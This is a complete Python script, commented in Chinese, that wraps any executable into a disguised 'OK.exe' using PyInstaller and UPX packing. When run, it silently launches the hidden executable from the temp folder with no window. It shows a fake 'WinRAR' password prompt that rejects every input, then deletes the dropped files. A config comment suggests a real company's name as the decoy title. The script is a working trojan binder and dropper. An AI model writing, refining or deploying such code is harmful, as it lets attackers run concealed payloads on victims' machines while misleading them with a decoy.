import subprocess
import tkinter as tk
from tkinter import messagebox, font
import os
import sys
import tempfile
import glob
import shutil
import time
import threading
import ctypes
from ctypes import wintypes

# ===== 可修改的配置项 =====
# 完整标题 - 可在此处修改为您需要的文字/广州市建筑集团有限公司/WinRAR
full_title = "WinRAR"
# =========================

# 定义Windows API函数
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.argtypes = []
kernel32.GetCurrentProcess.restype = wintypes.HANDLE

def is_pyinstaller_installed():
    """检查PyInstaller是否已安装"""
    try:
        import PyInstaller
        return True
    except ImportError:
        try:
            result = subprocess.run([sys.executable, '-m', 'PyInstaller', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except:
            return False

def get_upx_path():
    """查找UPX可执行文件"""
    possible_paths = [
        "upx.exe",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "upx.exe"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return os.path.abspath(path)
    
    return None

def optimize_exe_with_upx(exe_path):
    """使用UPX手动压缩exe文件（极致的压缩）"""
    upx_path = get_upx_path()
    if not upx_path or not os.path.exists(exe_path):
        return False
    
    print(f"开始使用UPX极致压缩: {os.path.basename(exe_path)}")
    
    # 备份原始文件
    backup_path = exe_path + '.bak'
    shutil.copy2(exe_path, backup_path)
    
    try:
        # 使用--force参数强制压缩GUARD_CF保护的文件
        cmd = [upx_path, '--best', '--lzma', '--force', exe_path]
        
        print(f"执行压缩命令: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            original_size = os.path.getsize(backup_path)
            current_size = os.path.getsize(exe_path)
            reduction = (original_size - current_size) / original_size * 100
            print(f"✓ UPX压缩成功: {original_size/1024/1024:.2f}MB -> {current_size/1024/1024:.2f}MB")
            print(f"压缩比例: {reduction:.1f}%")
            print(f"最终文件大小: {current_size/1024/1024:.2f} MB")
            
            # 清理备份
            os.remove(backup_path)
            return True
        else:
            print(f"✗ UPX压缩失败: {result.stderr}")
            
            # 恢复备份
            shutil.copy2(backup_path, exe_path)
            os.remove(backup_path)
            
            # 尝试不强制压缩
            try:
                cmd = [upx_path, '--best', '--lzma', exe_path]
                print(f"尝试不使用--force: {' '.join(cmd)}")
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    current_size = os.path.getsize(exe_path)
                    print(f"✓ 非强制压缩成功: {current_size/1024/1024:.2f}MB")
                    return True
            except:
                pass
                
            return False
                
    except Exception as e:
        print(f"压缩过程中出错: {e}")
        # 恢复备份
        if os.path.exists(backup_path):
            shutil.copy2(backup_path, exe_path)
            os.remove(backup_path)
        return False

def auto_package():
    """自动打包功能 - 最简单的方案"""
    if not hasattr(sys, 'frozen'):
        print("检测到Python脚本运行，开始自动打包...")
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        print(f"脚本目录: {script_dir}")
        
        # 搜索必要的资源文件
        ico_files = glob.glob(os.path.join(script_dir, "*.ico"))
        exe_files = [f for f in glob.glob(os.path.join(script_dir, "*.exe")) 
                    if os.path.basename(f).lower() != "ok.exe"]
        
        if not exe_files:
            print("错误：未找到可用的exe文件（已排除ok.exe）")
            input("按回车键退出...")
            return False
        
        # 检查PyInstaller是否安装
        if not is_pyinstaller_installed():
            print("未安装PyInstaller，正在安装...")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                             check=True, capture_output=True)
                print("PyInstaller安装完成")
            except subprocess.CalledProcessError as e:
                print(f"安装PyInstaller失败: {e}")
                input("按回车键退出...")
                return False
        
        # 构建最简单的打包命令
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',
            '--windowed',
            '--clean',
            '--noconfirm',
            '--name', 'OK',
            '--distpath', script_dir,
        ]
        
        # 添加图标
        if ico_files:
            cmd.extend(['--icon', ico_files[0]])
        
        # 添加资源文件
        cmd.extend(['--add-data', f'{exe_files[0]};.'])
        if ico_files:
            cmd.extend(['--add-data', f'{ico_files[0]};.'])
        
        # 添加排除模块以减少体积
        cmd.extend(['--exclude-module', 'matplotlib'])
        cmd.extend(['--exclude-module', 'numpy'])
        cmd.extend(['--exclude-module', 'pandas'])
        cmd.extend(['--exclude-module', 'scipy'])
        cmd.extend(['--exclude-module', 'pytest'])
        cmd.extend(['--exclude-module', 'setuptools'])
        cmd.extend(['--exclude-module', 'pip'])
        cmd.extend(['--exclude-module', 'wheel'])
        
        # 添加当前脚本
        cmd.append(__file__)
        
        print(f"执行打包命令: {' '.join(cmd[:10])}...")  # 只显示前10个参数
        
        try:
            original_cwd = os.getcwd()
            os.chdir(script_dir)
            
            print("开始打包，请稍候...")
            start_time = time.time()
            
            # 执行打包
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            end_time = time.time()
            print(f"打包过程完成! 耗时: {end_time - start_time:.2f}秒")
            
            if process.returncode != 0:
                print(f"打包失败，返回码: {process.returncode}")
                if stderr:
                    # 只显示错误的关键部分
                    error_lines = stderr.split('\n')
                    for line in error_lines[-20:]:  # 显示最后20行错误
                        if line.strip():
                            print(line)
                os.chdir(original_cwd)
                input("按回车键退出...")
                return False
            
            # 检查生成的exe
            final_exe_path = os.path.join(script_dir, 'OK.exe')
            
            if os.path.exists(final_exe_path):
                # 显示原始大小
                original_size = os.path.getsize(final_exe_path)
                print(f"\n原始打包大小: {original_size/1024/1024:.2f} MB")
                
                # 尝试UPX压缩
                print("\n=== 尝试UPX压缩 ===")
                if optimize_exe_with_upx(final_exe_path):
                    print("✓ UPX压缩成功")
                else:
                    print("⚠ UPX压缩失败，使用原始文件")
                
                # 显示最终大小
                final_size = os.path.getsize(final_exe_path)
                
                print(f"\n=== 打包结果 ===")
                print(f"最终大小: {final_size/1024/1024:.2f} MB")
                print(f"文件位置: {final_exe_path}")
                
                if original_size > 0:
                    reduction = (original_size - final_size) / original_size * 100
                    if reduction > 0:
                        print(f"体积减少: {reduction:.1f}%")
                
                # 清理临时文件
                cleanup_temp_files(script_dir)
                
                print("\n打包完成! 请运行生成的OK.exe文件")
                os.chdir(original_cwd)
                input("按回车键退出...")
                return True
            else:
                print("✗ 打包过程完成但未生成OK.exe文件")
                print("检查当前目录:")
                for file in os.listdir(script_dir):
                    if file.endswith('.exe'):
                        print(f"  - {file}")
                
                os.chdir(original_cwd)
                input("按回车键退出...")
                return False
            
        except Exception as e:
            print(f"打包过程出错: {e}")
            import traceback
            traceback.print_exc()
            os.chdir(original_cwd)
            input("按回车键退出...")
            return False
    return True

def cleanup_temp_files(script_dir):
    """清理临时文件"""
    print("清理临时文件...")
    
    # 删除build目录
    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        try:
            shutil.rmtree(build_dir)
            print("✓ 已删除 build 目录")
        except Exception as e:
            print(f"✗ 删除build目录失败: {e}")
    
    # 删除dist目录
    dist_dir = os.path.join(script_dir, 'dist')
    if os.path.exists(dist_dir):
        try:
            shutil.rmtree(dist_dir)
            print("✓ 已删除 dist 目录")
        except Exception as e:
            print(f"✗ 删除dist目录失败: {e}")
    
    # 删除spec文件
    spec_files = glob.glob(os.path.join(script_dir, "*.spec"))
    for spec_file in spec_files:
        try:
            os.remove(spec_file)
            print(f"✓ 已删除 {os.path.basename(spec_file)}")
        except Exception as e:
            print(f"✗ 删除{spec_file}失败: {e}")
    
    # 删除__pycache__目录
    pycache_dir = os.path.join(script_dir, '__pycache__')
    if os.path.exists(pycache_dir):
        try:
            shutil.rmtree(pycache_dir)
            print("✓ 已删除 __pycache__ 目录")
        except Exception as e:
            print(f"✗ 删除__pycache__目录失败: {e}")

# 其他函数保持不变...

def find_files_by_extension(extensions, exclude_files=None):
    """搜索指定扩展名的文件"""
    if exclude_files is None:
        exclude_files = []
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    found_files = []
    
    for ext in extensions:
        pattern = os.path.join(base_dir, f"*.{ext}")
        files = glob.glob(pattern)
        found_files.extend(files)
    
    exclude_files_lower = [f.lower() for f in exclude_files]
    filtered_files = [f for f in found_files 
                     if os.path.basename(f).lower() not in exclude_files_lower]
    
    return filtered_files

def get_embedded_file_path(relative_path):
    """获取嵌入在exe中的文件的正确路径"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def is_process_running(process_name):
    """检查指定进程是否在运行"""
    try:
        result = subprocess.run(['tasklist', '/fi', f'imagename eq {process_name}'], 
                              capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return process_name.lower() in result.stdout.lower()
    except:
        return False

def force_delete_folder(folder_path):
    """强制删除文件夹"""
    try:
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            return True
    except Exception as e:
        print(f"直接删除失败: {e}")
        
        try:
            subprocess.run(['cmd', '/c', 'rd', '/s', '/q', folder_path], 
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return not os.path.exists(folder_path)
        except:
            pass
    
    return False

def cleanup_pyinstaller_temp():
    """清理PyInstaller临时文件夹"""
    try:
        if hasattr(sys, '_MEIPASS'):
            temp_dir = sys._MEIPASS
            time.sleep(2)
            if force_delete_folder(temp_dir):
                return True
            else:
                return False
        return True
    except Exception as e:
        print(f"清理PyInstaller临时文件夹时出错: {e}")
        return False

def monitor_and_cleanup(temp_exe_path):
    """监控进程并在结束后清理"""
    try:
        process_name = os.path.basename(temp_exe_path)
        
        max_wait_time = 60
        wait_count = 0
        while wait_count < max_wait_time:
            if not is_process_running(process_name):
                break
            time.sleep(1)
            wait_count += 1
        
        # 删除临时exe文件
        max_attempts = 5
        for attempt in range(max_attempts):
            try:
                if os.path.exists(temp_exe_path):
                    os.remove(temp_exe_path)
                    break
            except Exception:
                if attempt < max_attempts - 1:
                    time.sleep(1)
        
        # 清理PyInstaller临时文件夹
        cleanup_pyinstaller_temp()
                
    except Exception:
        pass

def extract_and_run_original_exe():
    """自动搜索并运行exe文件"""
    exe_files = find_files_by_extension(['exe'], ['ok.exe'])
    
    if not exe_files:
        print("错误：未找到可用的exe文件（已排除ok.exe）")
        return False
    
    original_exe_path = exe_files[0]
    original_exe_name = os.path.basename(original_exe_path)
    
    if hasattr(sys, '_MEIPASS'):
        embedded_exe_path = get_embedded_file_path(original_exe_name)
        if not os.path.exists(embedded_exe_path):
            return False
        source_exe_path = embedded_exe_path
    else:
        source_exe_path = original_exe_path
    
    temp_dir = tempfile.gettempdir()
    temp_exe_path = os.path.join(temp_dir, original_exe_name)
    
    try:
        with open(source_exe_path, "rb") as f_in:
            with open(temp_exe_path, "wb") as f_out:
                f_out.write(f_in.read())
        
        subprocess.Popen(
            temp_exe_path,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # 启动监控线程
        monitor_thread = threading.Thread(
            target=monitor_and_cleanup, 
            args=(temp_exe_path,),
            daemon=True
        )
        monitor_thread.start()
        
        return True
    
    except Exception:
        try:
            if os.path.exists(temp_exe_path):
                os.remove(temp_exe_path)
        except:
            pass
        return False

def set_window_icon(window):
    """设置窗口图标"""
    ico_files = find_files_by_extension(['ico'])
    
    if not ico_files:
        return False
    
    icon_path = ico_files[0]
    
    if hasattr(sys, '_MEIPASS'):
        icon_path = get_embedded_file_path(os.path.basename(icon_path))
    
    try:
        window.iconbitmap(icon_path)
        return True
    except:
        try:
            if sys.platform.startswith('win32'):
                window.iconbitmap(default=icon_path)
                return True
        except:
            pass
    
    return False

def check_password():
    """密码检查函数"""
    messagebox.showerror("错误", "密码错误，请重试！")
    return False

def create_password_window():
    """创建密码输入窗口"""
    window = tk.Tk()
    
    initial_title = full_title[:6]
    window.title(initial_title)
    
    window_width = 243
    window_height = 135
    window.resizable(False, False)
    window.attributes("-topmost", True)
    
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2 - int(screen_height * 0.15)
    window.geometry(f"{window_width}x{window_height}+{x}+{y}")
    
    set_window_icon(window)
    
    custom_font = font.Font(family="微软雅黑", size=11, weight="bold")
    label = tk.Label(window, text="请 输 入 密 码", font=custom_font)
    label.pack(pady=10)
    
    password_entry = tk.Entry(window, show="*", width=20)
    password_entry.pack(pady=5)
    password_entry.focus()
    
    def on_check_password():
        check_password()
        password_entry.delete(0, tk.END)
        password_entry.focus()
    
    button_frame = tk.Frame(window)
    button_frame.pack(pady=10)
    
    custom_font_btn = font.Font(family="微软雅黑", size=10)
    confirm_btn = tk.Button(button_frame, text="确  认", command=on_check_password, width=8, font=custom_font_btn)
    confirm_btn.pack(side=tk.LEFT, padx=20)
    window.bind('<Return>', lambda event: on_check_password())
    
    close_btn = tk.Button(button_frame, text="关  闭", command=window.destroy, width=8, font=custom_font_btn)
    close_btn.pack(side=tk.LEFT, padx=20)
    
    def scroll_title():
        window.after(2000, start_scrolling)
    
    def start_scrolling():
        scroll_speed = 300
        current_index = 0
        is_paused = False
        
        def update_title():
            nonlocal current_index, is_paused
            
            if current_index == 0 and not is_paused:
                is_paused = True
                window.title(full_title[:6])
                window.after(2000, update_title)
                return
            
            is_paused = False
            display_text = full_title[current_index:current_index+6]
            
            if len(display_text) < 6:
                display_text += full_title[:6-len(display_text)]
            
            window.title(display_text)
            current_index = (current_index + 1) % len(full_title)
            window.after(scroll_speed, update_title)
        
        update_title()
    
    scroll_title()
    
    def on_closing():
        window.destroy()
        sys.exit(0)
    
    window.protocol("WM_DELETE_WINDOW", on_closing)
    window.mainloop()

def main():
    """主函数"""
    if not hasattr(sys, 'frozen'):
        if auto_package():
            return
    
    try:
        if not extract_and_run_original_exe():
            messagebox.showerror("错误", "无法启动目标程序")
            return
        create_password_window()
    except Exception as e:
        print(f"程序运行出错: {e}")
        if hasattr(sys, 'frozen'):
            messagebox.showerror("错误", f"程序运行出错: {e}")
        else:
            input("按回车键退出...")

if __name__ == "__main__":
    main()